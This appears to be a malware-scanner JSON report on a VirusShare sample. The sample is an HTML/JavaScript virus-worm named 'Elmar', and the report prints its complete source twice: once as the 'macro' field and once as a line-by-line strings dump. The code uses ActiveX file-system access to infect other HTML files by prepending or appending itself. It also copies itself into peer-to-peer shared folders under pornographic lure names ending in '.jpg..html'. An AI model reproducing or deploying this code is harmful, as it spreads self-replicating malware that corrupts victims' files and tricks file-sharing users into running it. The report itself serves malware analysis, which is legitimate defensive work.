{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateTextFile": "May create a text file",
            "Write": "May write to a file"
        },
        "macro": "<Elmar><html>\n<head>\n<script language=\"JavaScript\">\nThisFile = location.href;\n\nif (ThisFile.indexOf(\"file:///\") != -1) {\nThisFile = location.href.substr(8);\n\nfso = new ActiveXObject(\"Scripting.FileSystemObject\");\nFile = fso.GetFile(ThisFile);\nPath = File.ParentFolder;\nFileName = File.Name;\n\nReadVirus = fso.OpenTextFile(Path+\"\\\\\"+FileName, 1, false, 0);\nApp = ReadVirus.ReadLine();\nif (App.indexOf(\"<elmaR>\") != -1) {\nSize = File.Size;\nElmarPlace = eval(Size+\"-4612\");\nReadVirus = fso.OpenTextFile(Path+\"\\\\\"+FileName, 1, false, 0);\nReadVirus.Read(ElmarPlace);\nVirus = ReadVirus.ReadAll();\nReadVirus.Close();\n}\nelse {\nReadVirus = fso.OpenTextFile(Path+\"\\\\\"+FileName, 1, false, 0);\nVirus = ReadVirus.Read(4612);\nReadVirus.Close();\n}\n\nInfectFolder = Math.floor(Math.random()*4);\nif (InfectFolder < 3) {\nInfFolder = fso.GetSpecialFolder(InfectFolder);\n}\nelse {\nInfFolder = Path;\n}\nalert(InfFolder);\nInfectMethod = Math.floor(Math.random()*2);\nif (InfectMethod==0) {\nFolder = fso.GetFolder(InfFolder);\nFindFile = new Enumerator(Folder.Files);\nFindFile.moveFirst();\n\nwhile (FindFile.atEnd() == false) {\nFound = FindFile.item();\nFileType = fso.GetFile(Found);\nHTML = FileType.Type;\n\nif (Found != Path+\"\\\\\"+FileName) {\n\nif (HTML.indexOf(\"HTML\") != -1) {\nCheckInfection = fso.OpenTextFile(Found, 1, false, 0);\nMarker = CheckInfection.ReadLine();\nCheckInfection.Close();\n\nif (Marker.indexOf(\"<Elmar>\") == -1) {\nif (Marker.indexOf(\"<elmaR>\") == -1) {\nReadHost = fso.OpenTextFile(Found, 1, false, 0);\nHost = ReadHost.ReadAll();\nReadHost.Close();\n\nfso.CreateTextFile(Found);\nPrepend = fso.OpenTextFile(Found, 2, false, 0);\nPrepend.Write(Virus+Host);\nPrepend.Close();\n}\n}\n}\n}\nFindFile.moveNext();\n}\n}\n\nelse {\nFolder = fso.GetFolder(InfFolder);\nFindFile = new Enumerator(Folder.Files);\nFindFile.moveFirst();\n\nwhile (FindFile.atEnd() == false) {\nFound = FindFile.item();\nFileType = fso.GetFile(Found);\nHTML = FileType.Type;\n\nif (Found != Path+\"\\\\\"+FileName) {\n\nif (HTML.indexOf(\"HTML\") != -1) {\nCheckInfection = fso.OpenTextFile(Found, 1, false, 0);\nMarker = CheckInfection.ReadLine();\nCheckInfection.Close();\nItsMe = \"<elmaR>\";\n\nif (Marker.indexOf(\"<Elmar>\") == -1) {\nif (Marker.indexOf(\"<elmaR>\") == -1) {\nReadHost = fso.OpenTextFile(Found, 1, false, 0);\nHost = ReadHost.ReadAll();\nReadHost.Close();\n\nfso.CreateTextFile(Found);\nAppend = fso.OpenTextFile(Found, 2, false, 0);\nAppend.Write(ItsMe+Host+Virus);\nAppend.Close();\n}\n}\n}\n}\nFindFile.moveNext();\n}\n}\n\nP2PFolder = new Array();\nP2PFolder[0] = \"C:\\\\Program Files\\\\KMD\\\\My Shared Folder\\\\\";\nP2PFolder[1] = \"C:\\\\Program Files\\\\KaZaA\\\\My Shared Folder\\\\\";\nP2PFolder[2] = \"C:\\\\Program Files\\\\KaZaA Lite\\\\My Shared Folder\\\\\";\nP2PFolder[3] = \"C:\\\\Program Files\\\\Morpheus\\\\My Shared Folder\\\\\";\nP2PFolder[4] = \"C:\\\\Program Files\\\\Grokster\\\\My Grokster\\\\\";\nP2PFolder[5] = \"C:\\\\Program Files\\\\BearShare\\\\Shared\\\\\";\nP2PFolder[6] = \"C:\\\\Program Files\\\\Edonkey2000\\\\Incoming\\\\\";\nP2PFolder[7] = \"C:\\\\Programme\\\\KMD\\\\My Shared Folder\\\\\";\nP2PFolder[8] = \"C:\\\\Programme\\\\KaZaA\\\\My Shared Folder\\\\\";\nP2PFolder[9] = \"C:\\\\Programme\\\\KaZaA Lite\\\\My Shared Folder\\\\\";\n\nWorm = fso.GetFile(Path+\"\\\\\"+FileName);\nWormMethod = Math.floor(Math.random()*2);\nif (WormMethod == 0) {\nP2PCount = 0;\nwhile (P2PCount != 10) {\n\nif (fso.FolderExists(P2PFolder[P2PCount])) {\nFolder = fso.GetFolder(P2PFolder[P2PCount]);\nFindFile = new Enumerator(Folder.Files);\nFindFile.moveFirst();\n\nwhile (FindFile.atEnd() == false) {\nFound = FindFile.item();\nFoundName = fso.GetFile(Found).Name;\nif (FoundName.indexOf(\"..html\") == -1) {\nWorm.Copy(Found+\"..html\");\nFindFile.moveNext();\n}\nelse {\nbreak;\n}\n}\n}\nP2PCount = P2PCount+1;\n}\n}\n\nelse {\nPart1 = new Array();\nPart1[0] = \"Hot\";\nPart1[1] = \"Teen\";\nPart1[2] = \"Sexy\";\nPart1[3] = \"Fuckin\";\nPart1[4] = \"Wet\";\n\nPart2 = new Array();\nPart2[0] = \"Super\";\nPart2[1] = \"Black\";\nPart2[2] = \"XXX\";\nPart2[3] = \"Dildo\";\nPart2[4] = \"Asian\";\n\nPart3 = new Array();\nPart3[0] = \"Pussy\";\nPart3[1] = \"Lesbian\";\nPart3[2] = \"SexParty\";\nPart3[3] = \"Bitches\";\nPart3[4] = \"Ass\";\n\nP2PCount = 0;\nwhile (P2PCount != 10) {\n\nif (fso.FolderExists(P2PFolder[P2PCount])) {\nNames = 5;\nwhile (Names != 0) {\nName1 = Part1[Math.floor(Math.random()*5)];\nName2 = Part2[Math.floor(Math.random()*5)];\nName3 = Part3[Math.floor(Math.random()*5)];\n\nFakeName = Name1+Name2+Name3+\".jpg..html\";\nWorm.Copy(P2PFolder[P2PCount]+FakeName);\nNames = Names-1;\n}\n}\nP2PCount = P2PCount+1;\n}\nalert(\"done\");\n}\n\n}\n</script>\n</head>\n</html>"
    },
    "filename": "VirusShare_236f1a1ff007d664c5db46e403656025",
    "filesize": 4612,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "236f1a1ff007d664c5db46e403656025",
        "sha1": "1cae154a8b0f05df915c9c985a2943a5084c7ac8",
        "sha256": "0671cabb7bf597c69ac5499859283663fceb156555184068ec9d14709b839b8d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<Elmar><html>",
            "<head>",
            "<script language=\"JavaScript\">",
            "ThisFile = location.href;",
            "if (ThisFile.indexOf(\"file:///\") != -1) {",
            "ThisFile = location.href.substr(8);",
            "fso = new ActiveXObject(\"Scripting.FileSystemObject\");",
            "File = fso.GetFile(ThisFile);",
            "Path = File.ParentFolder;",
            "FileName = File.Name;",
            "ReadVirus = fso.OpenTextFile(Path+\"\\\\\"+FileName, 1, false, 0);",
            "App = ReadVirus.ReadLine();",
            "if (App.indexOf(\"<elmaR>\") != -1) {",
            "Size = File.Size;",
            "ElmarPlace = eval(Size+\"-4612\");",
            "ReadVirus = fso.OpenTextFile(Path+\"\\\\\"+FileName, 1, false, 0);",
            "ReadVirus.Read(ElmarPlace);",
            "Virus = ReadVirus.ReadAll();",
            "ReadVirus.Close();",
            "else {",
            "ReadVirus = fso.OpenTextFile(Path+\"\\\\\"+FileName, 1, false, 0);",
            "Virus = ReadVirus.Read(4612);",
            "ReadVirus.Close();",
            "InfectFolder = Math.floor(Math.random()*4);",
            "if (InfectFolder < 3) {",
            "InfFolder = fso.GetSpecialFolder(InfectFolder);",
            "else {",
            "InfFolder = Path;",
            "alert(InfFolder);",
            "InfectMethod = Math.floor(Math.random()*2);",
            "if (InfectMethod==0) {",
            "Folder = fso.GetFolder(InfFolder);",
            "FindFile = new Enumerator(Folder.Files);",
            "FindFile.moveFirst();",
            "while (FindFile.atEnd() == false) {",
            "Found = FindFile.item();",
            "FileType = fso.GetFile(Found);",
            "HTML = FileType.Type;",
            "if (Found != Path+\"\\\\\"+FileName) {",
            "if (HTML.indexOf(\"HTML\") != -1) {",
            "CheckInfection = fso.OpenTextFile(Found, 1, false, 0);",
            "Marker = CheckInfection.ReadLine();",
            "CheckInfection.Close();",
            "if (Marker.indexOf(\"<Elmar>\") == -1) {",
            "if (Marker.indexOf(\"<elmaR>\") == -1) {",
            "ReadHost = fso.OpenTextFile(Found, 1, false, 0);",
            "Host = ReadHost.ReadAll();",
            "ReadHost.Close();",
            "fso.CreateTextFile(Found);",
            "Prepend = fso.OpenTextFile(Found, 2, false, 0);",
            "Prepend.Write(Virus+Host);",
            "Prepend.Close();",
            "FindFile.moveNext();",
            "else {",
            "Folder = fso.GetFolder(InfFolder);",
            "FindFile = new Enumerator(Folder.Files);",
            "FindFile.moveFirst();",
            "while (FindFile.atEnd() == false) {",
            "Found = FindFile.item();",
            "FileType = fso.GetFile(Found);",
            "HTML = FileType.Type;",
            "if (Found != Path+\"\\\\\"+FileName) {",
            "if (HTML.indexOf(\"HTML\") != -1) {",
            "CheckInfection = fso.OpenTextFile(Found, 1, false, 0);",
            "Marker = CheckInfection.ReadLine();",
            "CheckInfection.Close();",
            "ItsMe = \"<elmaR>\";",
            "if (Marker.indexOf(\"<Elmar>\") == -1) {",
            "if (Marker.indexOf(\"<elmaR>\") == -1) {",
            "ReadHost = fso.OpenTextFile(Found, 1, false, 0);",
            "Host = ReadHost.ReadAll();",
            "ReadHost.Close();",
            "fso.CreateTextFile(Found);",
            "Append = fso.OpenTextFile(Found, 2, false, 0);",
            "Append.Write(ItsMe+Host+Virus);",
            "Append.Close();",
            "FindFile.moveNext();",
            "P2PFolder = new Array();",
            "P2PFolder[0] = \"C:\\\\Program Files\\\\KMD\\\\My Shared Folder\\\\\";",
            "P2PFolder[1] = \"C:\\\\Program Files\\\\KaZaA\\\\My Shared Folder\\\\\";",
            "P2PFolder[2] = \"C:\\\\Program Files\\\\KaZaA Lite\\\\My Shared Folder\\\\\";",
            "P2PFolder[3] = \"C:\\\\Program Files\\\\Morpheus\\\\My Shared Folder\\\\\";",
            "P2PFolder[4] = \"C:\\\\Program Files\\\\Grokster\\\\My Grokster\\\\\";",
            "P2PFolder[5] = \"C:\\\\Program Files\\\\BearShare\\\\Shared\\\\\";",
            "P2PFolder[6] = \"C:\\\\Program Files\\\\Edonkey2000\\\\Incoming\\\\\";",
            "P2PFolder[7] = \"C:\\\\Programme\\\\KMD\\\\My Shared Folder\\\\\";",
            "P2PFolder[8] = \"C:\\\\Programme\\\\KaZaA\\\\My Shared Folder\\\\\";",
            "P2PFolder[9] = \"C:\\\\Programme\\\\KaZaA Lite\\\\My Shared Folder\\\\\";",
            "Worm = fso.GetFile(Path+\"\\\\\"+FileName);",
            "WormMethod = Math.floor(Math.random()*2);",
            "if (WormMethod == 0) {",
            "P2PCount = 0;",
            "while (P2PCount != 10) {",
            "if (fso.FolderExists(P2PFolder[P2PCount])) {",
            "Folder = fso.GetFolder(P2PFolder[P2PCount]);",
            "FindFile = new Enumerator(Folder.Files);",
            "FindFile.moveFirst();",
            "while (FindFile.atEnd() == false) {",
            "Found = FindFile.item();",
            "FoundName = fso.GetFile(Found).Name;",
            "if (FoundName.indexOf(\"..html\") == -1) {",
            "Worm.Copy(Found+\"..html\");",
            "FindFile.moveNext();",
            "else {",
            "break;",
            "P2PCount = P2PCount+1;",
            "else {",
            "Part1 = new Array();",
            "Part1[0] = \"Hot\";",
            "Part1[1] = \"Teen\";",
            "Part1[2] = \"Sexy\";",
            "Part1[3] = \"Fuckin\";",
            "Part1[4] = \"Wet\";",
            "Part2 = new Array();",
            "Part2[0] = \"Super\";",
            "Part2[1] = \"Black\";",
            "Part2[2] = \"XXX\";",
            "Part2[3] = \"Dildo\";",
            "Part2[4] = \"Asian\";",
            "Part3 = new Array();",
            "Part3[0] = \"Pussy\";",
            "Part3[1] = \"Lesbian\";",
            "Part3[2] = \"SexParty\";",
            "Part3[3] = \"Bitches\";",
            "Part3[4] = \"Ass\";",
            "P2PCount = 0;",
            "while (P2PCount != 10) {",
            "if (fso.FolderExists(P2PFolder[P2PCount])) {",
            "Names = 5;",
            "while (Names != 0) {",
            "Name1 = Part1[Math.floor(Math.random()*5)];",
            "Name2 = Part2[Math.floor(Math.random()*5)];",
            "Name3 = Part3[Math.floor(Math.random()*5)];",
            "FakeName = Name1+Name2+Name3+\".jpg..html\";",
            "Worm.Copy(P2PFolder[P2PCount]+FakeName);",
            "Names = Names-1;",
            "P2PCount = P2PCount+1;",
            "alert(\"done\");",
            "</script>",
            "</head>",
            "</html>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "file:///"
        ]
    },
    "time": "0:00:00.296978",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
